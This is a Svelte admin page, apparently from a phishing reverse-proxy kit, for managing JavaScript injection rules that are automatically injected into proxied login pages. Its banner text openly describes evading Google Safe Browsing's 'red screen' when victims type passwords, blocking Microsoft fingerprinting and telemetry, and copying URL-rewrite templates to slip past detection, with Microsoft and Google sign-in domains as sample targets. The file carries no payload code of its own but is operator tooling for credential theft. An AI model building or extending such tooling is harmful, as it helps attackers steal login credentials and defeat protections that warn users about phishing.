<script>
	import { onMount } from 'svelte';
	import { api } from '$lib/api/apiProxy.js';
	import HeadTitle from '$lib/components/HeadTitle.svelte';
	import Headline from '$lib/components/Headline.svelte';
	import BigButton from '$lib/components/BigButton.svelte';
	import Modal from '$lib/components/Modal.svelte';
	import { addToast } from '$lib/store/toast';

	let rules = [];
	let rewriteTemplates = [];
	let isLoading = true;
	let activeTab = 'gsb_evasion'; // gsb_evasion, anti_detection, custom
	let showAddModal = false;
	let showRewriteModal = false;
	let showDeleteAlert = false;
	let deleteTargetId = null;

	let newRule = {
		name: '',
		triggerDomains: '',
		triggerPaths: '',
		script: '',
		scriptType: 'inline'
	};

	onMount(async () => {
		await loadRules();
		await loadRewriteTemplates();
	});

	async function loadRules() {
		try {
			isLoading = true;
			const res = await api.jsInjection.getRules();
			if (res && res.data) {
				rules = res.data;
			}
		} catch (e) {
			addToast('Failed to load rules', 'Error');
		} finally {
			isLoading = false;
		}
	}

	async function loadRewriteTemplates() {
		try {
			const res = await api.jsInjection.getRewriteTemplates();
			if (res && res.data) {
				rewriteTemplates = res.data;
			}
		} catch (e) {
			console.warn('Failed to load rewrite templates', e);
		}
	}

	async function toggleRule(id, currentEnabled) {
		try {
			await api.jsInjection.toggleRule(id, !currentEnabled);
			rules = rules.map(r => r.id === id ? { ...r, enabled: !currentEnabled } : r);
			addToast(`Rule ${!currentEnabled ? 'enabled' : 'disabled'}`, 'Success');
		} catch (e) {
			addToast('Failed to toggle rule', 'Error');
		}
	}

	async function addRule() {
		try {
			const payload = {
				name: newRule.name,
				triggerDomains: newRule.triggerDomains.split('\n').map(d => d.trim()).filter(Boolean),
				triggerPaths: newRule.triggerPaths.split('\n').map(p => p.trim()).filter(Boolean),
				script: newRule.script,
				scriptType: newRule.scriptType
			};
			await api.jsInjection.addRule(payload);
			addToast('Custom rule added', 'Success');
			showAddModal = false;
			newRule = { name: '', triggerDomains: '', triggerPaths: '', script: '', scriptType: 'inline' };
			await loadRules();
		} catch (e) {
			addToast('Failed to add rule', 'Error');
		}
	}

	async function confirmDelete() {
		if (!deleteTargetId) return;
		try {
			await api.jsInjection.deleteRule(deleteTargetId);
			addToast('Rule deleted', 'Success');
			showDeleteAlert = false;
			deleteTargetId = null;
			await loadRules();
		} catch (e) {
			addToast('Failed to delete rule', 'Error');
		}
	}

	function openAddModal() {
		showAddModal = true;
	}

	function closeAddModal() {
		showAddModal = false;
		newRule = { name: '', triggerDomains: '', triggerPaths: '', script: '', scriptType: 'inline' };
	}

	function openRewriteModal() {
		showRewriteModal = true;
	}

	function closeRewriteModal() {
		showRewriteModal = false;
	}

	function openDeleteAlert(id) {
		deleteTargetId = id;
		showDeleteAlert = true;
	}

	function closeDeleteAlert() {
		showDeleteAlert = false;
		deleteTargetId = null;
	}

	function copyToClipboard(text) {
		navigator.clipboard.writeText(text);
		addToast('Copied to clipboard', 'Success');
	}

	$: filteredRules = rules.filter(r => {
		if (activeTab === 'gsb_evasion') return r.category === 'gsb_evasion';
		if (activeTab === 'anti_detection') return r.category === 'anti_detection';
		if (activeTab === 'custom') return r.category === 'custom';
		return true;
	});

	$: gsbCount = rules.filter(r => r.category === 'gsb_evasion').length;
	$: antiDetCount = rules.filter(r => r.category === 'anti_detection').length;
	$: customCount = rules.filter(r => r.category === 'custom').length;
	$: enabledCount = rules.filter(r => r.enabled).length;
</script>

<HeadTitle title="Evasion Rules" />

<div class="flex flex-col gap-6 p-6">
	<Headline
		title="Evasion Rules"
		subtitle="Manage Google Safe Browsing evasion, anti-detection, and custom JS injection rules. These scripts are automatically injected into proxied pages."
	/>

	<!-- Stats Bar -->
	<div class="grid grid-cols-4 gap-4">
		<div class="bg-white dark:bg-gray-800 rounded-lg p-4 border border-gray-200 dark:border-gray-700">
			<div class="text-2xl font-bold text-green-600">{enabledCount}</div>
			<div class="text-sm text-gray-500">Active Rules</div>
		</div>
		<div class="bg-white dark:bg-gray-800 rounded-lg p-4 border border-gray-200 dark:border-gray-700">
			<div class="text-2xl font-bold text-red-500">{gsbCount}</div>
			<div class="text-sm text-gray-500">GSB Evasion</div>
		</div>
		<div class="bg-white dark:bg-gray-800 rounded-lg p-4 border border-gray-200 dark:border-gray-700">
			<div class="text-2xl font-bold text-blue-500">{antiDetCount}</div>
			<div class="text-sm text-gray-500">Anti-Detection</div>
		</div>
		<div class="bg-white dark:bg-gray-800 rounded-lg p-4 border border-gray-200 dark:border-gray-700">
			<div class="text-2xl font-bold text-purple-500">{customCount}</div>
			<div class="text-sm text-gray-500">Custom Rules</div>
		</div>
	</div>

	<!-- Action Buttons -->
	<div class="flex gap-3">
		<BigButton on:click={openAddModal}>
			+ Add Custom Rule
		</BigButton>
		<BigButton on:click={openRewriteModal}>
			URL Rewrite Templates
		</BigButton>
	</div>

	<!-- Tabs -->
	<div class="flex gap-1 bg-gray-100 dark:bg-gray-800 rounded-lg p-1 w-fit">
		<button
			class="px-4 py-2 rounded-md text-sm font-medium transition-all {activeTab === 'gsb_evasion' ? 'bg-red-500 text-white shadow' : 'text-gray-600 dark:text-gray-400 hover:bg-gray-200 dark:hover:bg-gray-700'}"
			on:click={() => activeTab = 'gsb_evasion'}
		>
			GSB Evasion ({gsbCount})
		</button>
		<button
			class="px-4 py-2 rounded-md text-sm font-medium transition-all {activeTab === 'anti_detection' ? 'bg-blue-500 text-white shadow' : 'text-gray-600 dark:text-gray-400 hover:bg-gray-200 dark:hover:bg-gray-700'}"
			on:click={() => activeTab = 'anti_detection'}
		>
			Anti-Detection ({antiDetCount})
		</button>
		<button
			class="px-4 py-2 rounded-md text-sm font-medium transition-all {activeTab === 'custom' ? 'bg-purple-500 text-white shadow' : 'text-gray-600 dark:text-gray-400 hover:bg-gray-200 dark:hover:bg-gray-700'}"
			on:click={() => activeTab = 'custom'}
		>
			Custom ({customCount})
		</button>
	</div>

	<!-- Info Banner for GSB Tab -->
	{#if activeTab === 'gsb_evasion'}
		<div class="bg-red-50 dark:bg-red-900/20 border border-red-200 dark:border-red-800 rounded-lg p-4">
			<h3 class="font-semibold text-red-700 dark:text-red-400 mb-2">Google Safe Browsing Evasion</h3>
			<p class="text-sm text-red-600 dark:text-red-300">
				These rules target the specific mechanisms that cause the "red screen" warning when victims enter passwords on proxy domains.
				They intercept Chrome's real-time phishing detection, block Microsoft's CryptoToken fingerprinting, sanitize page titles and meta tags,
				and prevent telemetry from exposing the proxy domain.
			</p>
			<p class="text-sm text-red-600 dark:text-red-300 mt-2">
				<strong>Important:</strong> For maximum effectiveness, also configure <strong>URL Rewrite Rules</strong> in your proxy config
				to obfuscate OAuth paths. Use the "URL Rewrite Templates" button above for ready-to-use configurations.
			</p>
		</div>
	{/if}

	<!-- Rules List -->
	{#if isLoading}
		<div class="flex justify-center py-12">
			<div class="animate-spin rounded-full h-8 w-8 border-b-2 border-cta-blue"></div>
		</div>
	{:else if filteredRules.length === 0}
		<div class="text-center py-12 text-gray-500">
			{#if activeTab === 'custom'}
				No custom rules yet. Click "Add Custom Rule" to create one.
			{:else}
				No rules in this category.
			{/if}
		</div>
	{:else}
		<div class="flex flex-col gap-3">
			{#each filteredRules as rule}
				<div class="bg-white dark:bg-gray-800 rounded-lg border border-gray-200 dark:border-gray-700 p-4 transition-all hover:shadow-md">
					<div class="flex items-center justify-between">
						<div class="flex items-center gap-3 flex-1">
							<!-- Toggle Switch -->
							<button
								class="relative inline-flex h-6 w-11 items-center rounded-full transition-colors {rule.enabled ? 'bg-green-500' : 'bg-gray-300 dark:bg-gray-600'}"
								on:click={() => toggleRule(rule.id, rule.enabled)}
							>
								<span
									class="inline-block h-4 w-4 transform rounded-full bg-white transition-transform {rule.enabled ? 'translate-x-6' : 'translate-x-1'}"
								></span>
							</button>

							<div class="flex-1">
								<div class="flex items-center gap-2">
									<span class="font-medium text-gray-900 dark:text-gray-100">{rule.name}</span>
									{#if rule.isBuiltin}
										<span class="px-2 py-0.5 text-xs rounded-full bg-gray-100 dark:bg-gray-700 text-gray-600 dark:text-gray-400">builtin</span>
									{/if}
									{#if rule.category === 'gsb_evasion'}
										<span class="px-2 py-0.5 text-xs rounded-full bg-red-100 dark:bg-red-900/30 text-red-600 dark:text-red-400">GSB</span>
									{:else if rule.category === 'anti_detection'}
										<span class="px-2 py-0.5 text-xs rounded-full bg-blue-100 dark:bg-blue-900/30 text-blue-600 dark:text-blue-400">Anti-Det</span>
									{:else}
										<span class="px-2 py-0.5 text-xs rounded-full bg-purple-100 dark:bg-purple-900/30 text-purple-600 dark:text-purple-400">Custom</span>
									{/if}
								</div>
								<div class="text-xs text-gray-500 dark:text-gray-400 mt-1">
									{#if rule.triggerDomains && rule.triggerDomains.length > 0}
										Domains: {rule.triggerDomains.join(', ')}
									{:else}
										All domains
									{/if}
									{#if rule.triggerPaths && rule.triggerPaths.length > 0 && rule.triggerPaths[0] !== '.*'}
										&middot; Paths: {rule.triggerPaths.join(', ')}
									{/if}
								</div>
							</div>
						</div>

						<div class="flex items-center gap-2">
							<span class="text-xs px-2 py-1 rounded {rule.enabled ? 'bg-green-100 dark:bg-green-900/30 text-green-600' : 'bg-gray-100 dark:bg-gray-700 text-gray-500'}">
								{rule.enabled ? 'Active' : 'Disabled'}
							</span>
							{#if !rule.isBuiltin}
								<button
									class="text-red-500 hover:text-red-700 text-sm p-1"
									on:click={() => openDeleteAlert(rule.id)}
								>
									<svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
										<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16" />
									</svg>
								</button>
							{/if}
						</div>
					</div>
				</div>
			{/each}
		</div>
	{/if}
</div>

<!-- Add Custom Rule Modal -->
<Modal headerText="Add Custom JS Injection Rule" visible={showAddModal} onClose={closeAddModal}>
	<div class="space-y-4 py-4">
		<div class="space-y-1">
			<label class="block text-sm font-medium text-gray-700 dark:text-gray-300">
				Rule Name <span class="text-red-500">*</span>
			</label>
			<input
				type="text"
				bind:value={newRule.name}
				placeholder="My Custom Rule"
				class="w-full px-3 py-2 text-sm rounded-md border border-gray-300 dark:border-gray-600 bg-white dark:bg-gray-800 text-gray-900 dark:text-gray-100 focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none transition-colors"
			/>
		</div>
		<div class="space-y-1">
			<label class="block text-sm font-medium text-gray-700 dark:text-gray-300">
				Trigger Domains
			</label>
			<p class="text-xs text-gray-500 dark:text-gray-400">One domain per line. Leave empty to match all domains.</p>
			<textarea
				bind:value={newRule.triggerDomains}
				placeholder={"login.microsoftonline.com\naccounts.google.com"}
				rows={3}
				class="w-full px-3 py-2 text-sm rounded-md border border-gray-300 dark:border-gray-600 bg-white dark:bg-gray-800 text-gray-900 dark:text-gray-100 focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none transition-colors font-mono"
			></textarea>
		</div>
		<div class="space-y-1">
			<label class="block text-sm font-medium text-gray-700 dark:text-gray-300">
				Trigger Paths
			</label>
			<p class="text-xs text-gray-500 dark:text-gray-400">Regex patterns, one per line. Use .* to match all paths.</p>
			<textarea
				bind:value={newRule.triggerPaths}
				placeholder={".*\n/login.*"}
				rows={2}
				class="w-full px-3 py-2 text-sm rounded-md border border-gray-300 dark:border-gray-600 bg-white dark:bg-gray-800 text-gray-900 dark:text-gray-100 focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none transition-colors font-mono"
			></textarea>
		</div>
		<div class="space-y-1">
			<label class="block text-sm font-medium text-gray-700 dark:text-gray-300">
				JavaScript <span class="text-red-500">*</span>
			</label>
			<p class="text-xs text-gray-500 dark:text-gray-400">The JS code to inject into matching pages.</p>
			<textarea
				bind:value={newRule.script}
				placeholder={"// Your custom JavaScript here\nconsole.log('injected');"}
				rows={8}
				class="w-full px-3 py-2 text-sm rounded-md border border-gray-300 dark:border-gray-600 bg-white dark:bg-gray-800 text-gray-900 dark:text-gray-100 focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none transition-colors font-mono"
			></textarea>
		</div>
	</div>
	<div class="flex justify-end gap-3 pb-4">
		<button class="px-4 py-2 text-gray-600 dark:text-gray-400 hover:text-gray-800 dark:hover:text-gray-200 rounded-md" on:click={closeAddModal}>Cancel</button>
		<button
			class="px-4 py-2 bg-cta-blue text-white rounded-md hover:opacity-80 disabled:opacity-50"
			disabled={!newRule.name || !newRule.script}
			on:click={addRule}
		>
			Add Rule
		</button>
	</div>
</Modal>

<!-- URL Rewrite Templates Modal -->
<Modal headerText="Prebuilt URL Rewrite Templates" visible={showRewriteModal} onClose={closeRewriteModal}>
	<div class="py-4">
		<div class="mb-4 p-3 bg-yellow-50 dark:bg-yellow-900/20 border border-yellow-200 dark:border-yellow-800 rounded-lg">
			<p class="text-sm text-yellow-700 dark:text-yellow-300">
				These templates provide ready-to-use <code class="bg-yellow-100 dark:bg-yellow-900/40 px-1 rounded">rewrite_urls</code> YAML configurations for your proxy setup.
				Copy the YAML and paste it into your proxy configuration to obfuscate URL paths and evade GSB pattern matching.
			</p>
		</div>
		{#if rewriteTemplates.length === 0}
			<div class="text-center py-8 text-gray-500">
				<p>No rewrite templates available.</p>
				<p class="text-sm mt-1">Templates are generated from the builtin URL rewrite rules in the proxy service.</p>
			</div>
		{:else}
			<div class="flex flex-col gap-4 max-h-[60vh] overflow-y-auto">
				{#each rewriteTemplates as template}
					<div class="bg-white dark:bg-gray-800 rounded-lg border border-gray-200 dark:border-gray-700 p-4">
						<div class="flex items-center justify-between mb-2">
							<div>
								<h3 class="font-semibold text-gray-900 dark:text-gray-100">{template.name}</h3>
								<p class="text-xs text-gray-500">{template.description}</p>
								<span class="inline-block mt-1 px-2 py-0.5 text-xs rounded-full bg-blue-100 dark:bg-blue-900/30 text-blue-600 dark:text-blue-400">
									Target: {template.target}
								</span>
							</div>
							<button
								class="px-3 py-1.5 bg-cta-blue text-white text-sm rounded-md hover:opacity-80"
								on:click={() => copyToClipboard(template.yaml)}
							>
								Copy YAML
							</button>
						</div>
						<pre class="bg-gray-900 text-green-400 p-3 rounded text-xs font-mono overflow-auto max-h-48 mt-2">{template.yaml}</pre>
					</div>
				{/each}
			</div>
		{/if}
	</div>
	<div class="flex justify-end pb-4">
		<button class="px-4 py-2 text-gray-600 dark:text-gray-400 hover:text-gray-800 dark:hover:text-gray-200 rounded-md" on:click={closeRewriteModal}>Close</button>
	</div>
</Modal>

<!-- Delete Confirmation Modal -->
<Modal headerText="Delete Rule" visible={showDeleteAlert} onClose={closeDeleteAlert}>
	<div class="py-4">
		<p class="text-gray-600 dark:text-gray-400">Are you sure you want to delete this custom rule? This action cannot be undone.</p>
	</div>
	<div class="flex justify-end gap-3 pb-4">
		<button class="px-4 py-2 text-gray-600 dark:text-gray-400 hover:text-gray-800 dark:hover:text-gray-200 rounded-md" on:click={closeDeleteAlert}>Cancel</button>
		<button class="px-4 py-2 bg-red-500 text-white rounded-md hover:opacity-80" on:click={confirmDelete}>Delete</button>
	</div>
</Modal>
